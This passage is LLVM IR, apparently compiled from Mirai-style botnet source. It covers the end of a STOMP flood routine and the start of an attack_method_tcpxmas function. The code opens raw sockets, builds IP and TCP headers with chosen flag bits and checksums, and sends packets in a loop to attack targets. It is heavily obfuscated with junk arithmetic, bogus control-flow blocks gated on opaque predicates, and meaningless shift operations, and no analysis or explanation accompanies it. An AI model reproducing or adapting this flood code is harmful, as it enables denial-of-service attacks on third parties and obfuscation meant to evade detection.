  %852 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %853 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %852, i32 0, i32 8
  store i32 %851, i32* %853, align 4
  %854 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %855 = load i32, i32* %9, align 4
  %856 = sext i32 %855 to i64
  %857 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %854, i64 %856
  %858 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %857, i32 0, i32 0
  %859 = load i32, i32* %858, align 4
  %860 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %861 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %860, i32 0, i32 9
  store i32 %859, i32* %861, align 4
  %862 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %863 = load i32, i32* %9, align 4
  %864 = sext i32 %863 to i64
  %865 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %862, i64 %864
  %866 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %865, i32 0, i32 3
  %867 = load i16, i16* %866, align 4
  %868 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %869 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %868, i32 0, i32 0
  store i16 %867, i16* %869, align 4
  %870 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %871 = load i32, i32* %9, align 4
  %872 = sext i32 %871 to i64
  %873 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %870, i64 %872
  %874 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %873, i32 0, i32 4
  %875 = load i16, i16* %874, align 2
  %876 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %877 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %876, i32 0, i32 1
  store i16 %875, i16* %877, align 2
  %878 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %879 = load i32, i32* %9, align 4
  %880 = sext i32 %879 to i64
  %881 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %878, i64 %880
  %882 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %881, i32 0, i32 2
  %883 = load i32, i32* %882, align 4
  %884 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %885 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %884, i32 0, i32 2
  store i32 %883, i32* %885, align 4
  %886 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %887 = load i32, i32* %9, align 4
  %888 = sext i32 %887 to i64
  %889 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %886, i64 %888
  %890 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %889, i32 0, i32 1
  %891 = load i32, i32* %890, align 4
  %892 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %893 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %892, i32 0, i32 3
  store i32 %891, i32* %893, align 4
  %894 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %895 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %894, i32 0, i32 4
  %896 = load i16, i16* %895, align 4
  %_31 = shl i16 %896, -241
  %_32 = shl i16 %896, -241
  %_33 = shl i16 %896, -241
  %_34 = sub i16 0, %896
  %gen35 = add i16 %_34, -241
  %897 = and i16 %896, -241
  %_36 = sub i16 %897, 128
  %gen37 = mul i16 %_36, 128
  %_38 = sub i16 %897, 128
  %gen39 = mul i16 %_38, 128
  %_40 = shl i16 %897, 128
  %_41 = sub i16 %897, 128
  %gen42 = mul i16 %_41, 128
  %898 = or i16 %897, 128
  store i16 %898, i16* %895, align 4
  %899 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %900 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %899, i32 0, i32 4
  %901 = load i16, i16* %900, align 4
  %_43 = shl i16 %901, -257
  %_44 = sub i16 0, %901
  %gen45 = add i16 %_44, -257
  %902 = and i16 %901, -257
  %_46 = sub i16 0, %902
  %gen47 = add i16 %_46, 256
  %_48 = sub i16 0, %902
  %gen49 = add i16 %_48, 256
  %_50 = shl i16 %902, 256
  %_51 = sub i16 0, %902
  %gen52 = add i16 %_51, 256
  %_53 = shl i16 %902, 256
  %_54 = sub i16 0, %902
  %gen55 = add i16 %_54, 256
  %_56 = shl i16 %902, 256
  %_57 = sub i16 0, %902
  %gen58 = add i16 %_57, 256
  %903 = or i16 %902, 256
  store i16 %903, i16* %900, align 4
  %904 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %905 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %904, i32 0, i32 4
  %906 = load i16, i16* %905, align 4
  %_59 = sub i16 0, %906
  %gen60 = add i16 %_59, -4097
  %_61 = sub i16 0, %906
  %gen62 = add i16 %_61, -4097
  %_63 = sub i16 0, %906
  %gen64 = add i16 %_63, -4097
  %_65 = sub i16 0, %906
  %gen66 = add i16 %_65, -4097
  %_67 = shl i16 %906, -4097
  %_68 = sub i16 %906, -4097
  %gen69 = mul i16 %_68, -4097
  %907 = and i16 %906, -4097
  %_70 = shl i16 %907, 4096
  %_71 = sub i16 0, %907
  %gen72 = add i16 %_71, 4096
  %_73 = sub i16 %907, 4096
  %gen74 = mul i16 %_73, 4096
  %_75 = sub i16 0, %907
  %gen76 = add i16 %_75, 4096
  %_77 = sub i16 %907, 4096
  %gen78 = mul i16 %_77, 4096
  %_79 = sub i16 %907, 4096
  %gen80 = mul i16 %_79, 4096
  %_81 = sub i16 0, %907
  %gen82 = add i16 %_81, 4096
  %_83 = sub i16 %907, 4096
  %gen84 = mul i16 %_83, 4096
  %908 = or i16 %907, 4096
  store i16 %908, i16* %905, align 4
  %909 = call i32 @rand_next()
  %_85 = sub i32 0, %909
  %gen86 = add i32 %_85, 65535
  %_87 = sub i32 0, %909
  %gen88 = add i32 %_87, 65535
  %_89 = shl i32 %909, 65535
  %_90 = sub i32 0, %909
  %gen91 = add i32 %_90, 65535
  %_92 = sub i32 0, %909
  %gen93 = add i32 %_92, 65535
  %910 = and i32 %909, 65535
  %911 = trunc i32 %910 to i16
  %912 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %913 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %912, i32 0, i32 5
  store i16 %911, i16* %913, align 2
  %914 = load i8, i8* %18, align 1
  %915 = sext i8 %914 to i16
  %916 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %917 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %916, i32 0, i32 4
  %918 = load i16, i16* %917, align 4
  %_94 = sub i16 0, %915
  %gen95 = add i16 %_94, 1
  %_96 = shl i16 %915, 1
  %_97 = sub i16 %915, 1
  %gen98 = mul i16 %_97, 1
  %919 = and i16 %915, 1
  %_99 = shl i16 %919, 13
  %_100 = sub i16 %919, 13
  %gen101 = mul i16 %_100, 13
  %_102 = sub i16 0, %919
  %gen103 = add i16 %_102, 13
  %_104 = sub i16 0, %919
  %gen105 = add i16 %_104, 13
  %_106 = sub i16 %919, 13
  %gen107 = mul i16 %_106, 13
  %_108 = shl i16 %919, 13
  %920 = shl i16 %919, 13
  %_109 = shl i16 %918, -8193
  %_110 = sub i16 %918, -8193
  %gen111 = mul i16 %_110, -8193
  %_112 = sub i16 0, %918
  %gen113 = add i16 %_112, -8193
  %_114 = shl i16 %918, -8193
  %921 = and i16 %918, -8193
  %_115 = shl i16 %921, %920
  %_116 = sub i16 %921, %920
  %gen117 = mul i16 %_116, %920
  %_118 = shl i16 %921, %920
  %_119 = sub i16 0, %921
  %gen120 = add i16 %_119, %920
  %922 = or i16 %921, %920
  store i16 %922, i16* %917, align 4
  %923 = load i8, i8* %19, align 1
  %924 = sext i8 %923 to i16
  %925 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %926 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %925, i32 0, i32 4
  %927 = load i16, i16* %926, align 4
  %_121 = sub i16 %924, 1
  %gen122 = mul i16 %_121, 1
  %_123 = shl i16 %924, 1
  %_124 = sub i16 0, %924
  %gen125 = add i16 %_124, 1
  %_126 = sub i16 %924, 1
  %gen127 = mul i16 %_126, 1
  %_128 = sub i16 %924, 1
  %gen129 = mul i16 %_128, 1
  %928 = and i16 %924, 1
  %_130 = shl i16 %928, 12
  %_131 = sub i16 %928, 12
  %gen132 = mul i16 %_131, 12
  %_133 = shl i16 %928, 12
  %929 = shl i16 %928, 12
  %_134 = shl i16 %927, -4097
  %_135 = sub i16 %927, -4097
  %gen136 = mul i16 %_135, -4097
  %_137 = sub i16 0, %927
  %gen138 = add i16 %_137, -4097
  %_139 = shl i16 %927, -4097
  %_140 = sub i16 %927, -4097
  %gen141 = mul i16 %_140, -4097
  %930 = and i16 %927, -4097
  %_142 = sub i16 0, %930
  %gen143 = add i16 %_142, %929
  %_144 = sub i16 %930, %929
  %gen145 = mul i16 %_144, %929
  %931 = or i16 %930, %929
  store i16 %931, i16* %926, align 4
  %932 = load i8, i8* %20, align 1
  %933 = sext i8 %932 to i16
  %934 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %935 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %934, i32 0, i32 4
  %936 = load i16, i16* %935, align 4
  %_146 = sub i16 0, %933
  %gen147 = add i16 %_146, 1
  %_148 = sub i16 0, %933
  %gen149 = add i16 %_148, 1
  %_150 = sub i16 %933, 1
  %gen151 = mul i16 %_150, 1
  %_152 = sub i16 0, %933
  %gen153 = add i16 %_152, 1
  %_154 = sub i16 0, %933
  %gen155 = add i16 %_154, 1
  %_156 = shl i16 %933, 1
  %_157 = shl i16 %933, 1
  %937 = and i16 %933, 1
  %_158 = shl i16 %937, 11
  %_159 = sub i16 0, %937
  %gen160 = add i16 %_159, 11
  %_161 = shl i16 %937, 11
  %_162 = shl i16 %937, 11
  %_163 = sub i16 %937, 11
  %gen164 = mul i16 %_163, 11
  %_165 = sub i16 0, %937
  %gen166 = add i16 %_165, 11
  %_167 = sub i16 %937, 11
  %gen168 = mul i16 %_167, 11
  %938 = shl i16 %937, 11
  %_169 = shl i16 %936, -2049
  %_170 = sub i16 0, %936
  %gen171 = add i16 %_170, -2049
  %_172 = shl i16 %936, -2049
  %_173 = sub i16 %936, -2049
  %gen174 = mul i16 %_173, -2049
  %939 = and i16 %936, -2049
  %_175 = sub i16 0, %939
  %gen176 = add i16 %_175, %938
  %_177 = sub i16 %939, %938
  %gen178 = mul i16 %_177, %938
  %940 = or i16 %939, %938
  store i16 %940, i16* %935, align 4
  %941 = load i8, i8* %21, align 1
  %942 = sext i8 %941 to i16
  %943 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %944 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %943, i32 0, i32 4
  %945 = load i16, i16* %944, align 4
  %_179 = shl i16 %942, 1
  %_180 = sub i16 0, %942
  %gen181 = add i16 %_180, 1
  %_182 = sub i16 0, %942
  %gen183 = add i16 %_182, 1
  %_184 = sub i16 0, %942
  %gen185 = add i16 %_184, 1
  %946 = and i16 %942, 1
  %_186 = sub i16 0, %946
  %gen187 = add i16 %_186, 10
  %_188 = sub i16 0, %946
  %gen189 = add i16 %_188, 10
  %_190 = sub i16 %946, 10
  %gen191 = mul i16 %_190, 10
  %_192 = shl i16 %946, 10
  %_193 = sub i16 %946, 10
  %gen194 = mul i16 %_193, 10
  %_195 = sub i16 0, %946
  %gen196 = add i16 %_195, 10
  %_197 = sub i16 0, %946
  %gen198 = add i16 %_197, 10
  %_199 = shl i16 %946, 10
  %947 = shl i16 %946, 10
  %_200 = sub i16 0, %945
  %gen201 = add i16 %_200, -1025
  %_202 = sub i16 0, %945
  %gen203 = add i16 %_202, -1025
  %948 = and i16 %945, -1025
  %_204 = sub i16 0, %948
  %gen205 = add i16 %_204, %947
  %_206 = shl i16 %948, %947
  %949 = or i16 %948, %947
  store i16 %949, i16* %944, align 4
  %950 = load i8, i8* %22, align 1
  %951 = sext i8 %950 to i16
  %952 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %953 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %952, i32 0, i32 4
  %954 = load i16, i16* %953, align 4
  %_207 = sub i16 %951, 1
  %gen208 = mul i16 %_207, 1
  %_209 = shl i16 %951, 1
  %_210 = sub i16 %951, 1
  %gen211 = mul i16 %_210, 1
  %_212 = shl i16 %951, 1
  %_213 = sub i16 0, %951
  %gen214 = add i16 %_213, 1
  %_215 = sub i16 0, %951
  %gen216 = add i16 %_215, 1
  %_217 = sub i16 0, %951
  %gen218 = add i16 %_217, 1
  %_219 = sub i16 %951, 1
  %gen220 = mul i16 %_219, 1
  %955 = and i16 %951, 1
  %_221 = sub i16 %955, 9
  %gen222 = mul i16 %_221, 9
  %956 = shl i16 %955, 9
  %_223 = shl i16 %954, -513
  %_224 = sub i16 %954, -513
  %gen225 = mul i16 %_224, -513
  %_226 = sub i16 %954, -513
  %gen227 = mul i16 %_226, -513
  %_228 = sub i16 %954, -513
  %gen229 = mul i16 %_228, -513
  %_230 = sub i16 0, %954
  %gen231 = add i16 %_230, -513
  %_232 = sub i16 0, %954
  %gen233 = add i16 %_232, -513
  %957 = and i16 %954, -513
  %_234 = sub i16 %957, %956
  %gen235 = mul i16 %_234, %956
  %_236 = sub i16 0, %957
  %gen237 = add i16 %_236, %956
  %958 = or i16 %957, %956
  store i16 %958, i16* %953, align 4
  %959 = load i8, i8* %23, align 1
  %960 = sext i8 %959 to i16
  %961 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %962 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %961, i32 0, i32 4
  %963 = load i16, i16* %962, align 4
  %_238 = shl i16 %960, 1
  %_239 = sub i16 %960, 1
  %gen240 = mul i16 %_239, 1
  %964 = and i16 %960, 1
  %_241 = shl i16 %964, 8
  %_242 = shl i16 %964, 8
  %_243 = sub i16 0, %964
  %gen244 = add i16 %_243, 8
  %965 = shl i16 %964, 8
  %_245 = sub i16 %963, -257
  %gen246 = mul i16 %_245, -257
  %_247 = shl i16 %963, -257
  %_248 = shl i16 %963, -257
  %_249 = shl i16 %963, -257
  %_250 = sub i16 %963, -257
  %gen251 = mul i16 %_250, -257
  %966 = and i16 %963, -257
  %_252 = sub i16 %966, %965
  %gen253 = mul i16 %_252, %965
  %_254 = sub i16 %966, %965
  %gen255 = mul i16 %_254, %965
  %967 = or i16 %966, %965
  store i16 %967, i16* %962, align 4
  %968 = load i8*, i8** %38, align 8
  %969 = load i32, i32* %24, align 4
  call void @rand_str(i8* %968, i32 %969)
  br label %originalBB30

originalBB259alteredBB:                           ; preds = %originalBB259, %575
  br label %originalBB259

originalBB263alteredBB:                           ; preds = %originalBB263, %594
  %970 = call i64 @time(i64* null) #6
  %971 = load i64, i64* %31, align 8
  %_264 = sub i64 %970, %971
  %gen265 = mul i64 %_264, %971
  %_266 = sub i64 0, %970
  %gen267 = add i64 %_266, %971
  %972 = sub nsw i64 %970, %971
  %973 = icmp sgt i64 %972, 10
  br label %originalBB263

originalBB271alteredBB:                           ; preds = %originalBB271, %615
  %974 = load i32, i32* %26, align 4
  %975 = call i32 @close(i32 %974)
  br label %originalBB271

originalBB275alteredBB:                           ; preds = %originalBB275, %636
  %976 = load i32, i32* %9, align 4
  %_276 = sub i32 0, %976
  %gen277 = add i32 %_276, 1
  %_278 = shl i32 %976, 1
  %_279 = shl i32 %976, 1
  %_280 = sub i32 0, %976
  %gen281 = add i32 %_280, 1
  %977 = add nsw i32 %976, 1
  store i32 %977, i32* %9, align 4
  br label %originalBB275

originalBB285alteredBB:                           ; preds = %originalBB285, %657
  %978 = load i32, i32* %9, align 4
  %979 = load i8, i8* %5, align 1
  %980 = zext i8 %979 to i32
  %981 = icmp slt i32 %978, %980
  br label %originalBB285

originalBB289alteredBB:                           ; preds = %originalBB289, %707
  %982 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %983 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %982, i32 0, i32 7
  store i16 0, i16* %983, align 2
  %984 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %985 = bitcast %struct.iphdr* %984 to i16*
  %986 = call zeroext i16 @checksum_generic(i16* %985, i32 20)
  %987 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %988 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %987, i32 0, i32 7
  store i16 %986, i16* %988, align 2
  %989 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %990 = load i32, i32* %9, align 4
  %991 = sext i32 %990 to i64
  %992 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %989, i64 %991
  %993 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %992, i32 0, i32 1
  %994 = load i32, i32* %993, align 4
  %_290 = sub i32 0, %994
  %gen291 = add i32 %_290, 1
  %_292 = shl i32 %994, 1
  %995 = add i32 %994, 1
  store i32 %995, i32* %993, align 4
  %996 = trunc i32 %994 to i16
  %997 = call zeroext i16 @htons(i16 zeroext %996) #7
  %998 = zext i16 %997 to i32
  %999 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %1000 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %999, i32 0, i32 2
  store i32 %998, i32* %1000, align 4
  %1001 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %1002 = load i32, i32* %9, align 4
  %1003 = sext i32 %1002 to i64
  %1004 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1001, i64 %1003
  %1005 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1004, i32 0, i32 2
  %1006 = load i32, i32* %1005, align 4
  %1007 = trunc i32 %1006 to i16
  %1008 = call zeroext i16 @htons(i16 zeroext %1007) #7
  %1009 = zext i16 %1008 to i32
  %1010 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %1011 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1010, i32 0, i32 3
  store i32 %1009, i32* %1011, align 4
  %1012 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %1013 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1012, i32 0, i32 6
  store i16 0, i16* %1013, align 4
  %1014 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %1015 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %1016 = bitcast %struct.tcphdr* %1015 to i8*
  %1017 = load i32, i32* %24, align 4
  %1018 = sext i32 %1017 to i64
  %_293 = sub i64 20, %1018
  %gen294 = mul i64 %_293, %1018
  %1019 = add i64 20, %1018
  %1020 = trunc i64 %1019 to i16
  %1021 = call zeroext i16 @htons(i16 zeroext %1020) #7
  %1022 = load i32, i32* %24, align 4
  %1023 = sext i32 %1022 to i64
  %_295 = shl i64 20, %1023
  %_296 = sub i64 0, 20
  %gen297 = add i64 %_296, %1023
  %_298 = shl i64 20, %1023
  %1024 = add i64 20, %1023
  %1025 = trunc i64 %1024 to i32
  %1026 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %1014, i8* %1016, i16 zeroext %1021, i32 %1025)
  %1027 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %1028 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1027, i32 0, i32 6
  store i16 %1026, i16* %1028, align 4
  %1029 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %1030 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1029, i32 0, i32 1
  %1031 = load i16, i16* %1030, align 2
  %1032 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %1033 = load i32, i32* %9, align 4
  %1034 = sext i32 %1033 to i64
  %1035 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1032, i64 %1034
  %1036 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1035, i32 0, i32 0
  %1037 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1036, i32 0, i32 1
  store i16 %1031, i16* %1037, align 2
  %1038 = load i32, i32* %10, align 4
  %1039 = load i8*, i8** %39, align 8
  %1040 = load i32, i32* %24, align 4
  %1041 = sext i32 %1040 to i64
  %_299 = sub i64 40, %1041
  %gen300 = mul i64 %_299, %1041
  %_301 = shl i64 40, %1041
  %_302 = sub i64 0, 40
  %gen303 = add i64 %_302, %1041
  %_304 = sub i64 40, %1041
  %gen305 = mul i64 %_304, %1041
  %_306 = shl i64 40, %1041
  %_307 = sub i64 40, %1041
  %gen308 = mul i64 %_307, %1041
  %_309 = sub i64 0, 40
  %gen310 = add i64 %_309, %1041
  %1042 = add i64 40, %1041
  %1043 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %1044 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %1045 = load i32, i32* %9, align 4
  %1046 = sext i32 %1045 to i64
  %1047 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1044, i64 %1046
  %1048 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1047, i32 0, i32 0
  %1049 = bitcast %struct.sockaddr_in* %1048 to %struct.sockaddr*
  store %struct.sockaddr* %1049, %struct.sockaddr** %1043, align 8
  %1050 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %1051 = load %struct.sockaddr*, %struct.sockaddr** %1050, align 8
  %1052 = call i64 @sendto(i32 %1038, i8* %1039, i64 %1042, i32 16384, %struct.sockaddr* %1051, i32 16)
  br label %originalBB289

originalBB314alteredBB:                           ; preds = %originalBB314, %795
  %1053 = load i32, i32* %9, align 4
  %_315 = shl i32 %1053, 1
  %_316 = sub i32 %1053, 1
  %gen317 = mul i32 %_316, 1
  %1054 = add nsw i32 %1053, 1
  store i32 %1054, i32* %9, align 4
  br label %originalBB314
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpxmas(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #6
  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #6
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 1)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 1)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %4
  br label %831

; <label>:106:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %107 = load i32, i32* %10, align 4
  %108 = bitcast i32* %9 to i8*
  %109 = call i32 @setsockopt(i32 %107, i32 0, i32 3, i8* %108, i32 4) #6
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %111, label %114

; <label>:111:                                    ; preds = %106
  %112 = load i32, i32* %10, align 4
  %113 = call i32 @close(i32 %112)
  br label %831

; <label>:114:                                    ; preds = %106
  store i32 0, i32* %9, align 4
  br label %115

; <label>:115:                                    ; preds = %668, %114
  %116 = load i32, i32* %9, align 4
  %117 = load i8, i8* %5, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp slt i32 %116, %118
  br i1 %119, label %120, label %671

; <label>:120:                                    ; preds = %115
  %121 = load i32, i32* @x.31
  %122 = load i32, i32* @y.32
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %120
  %129 = load i32, i32* @x.31
  %130 = load i32, i32* @y.32
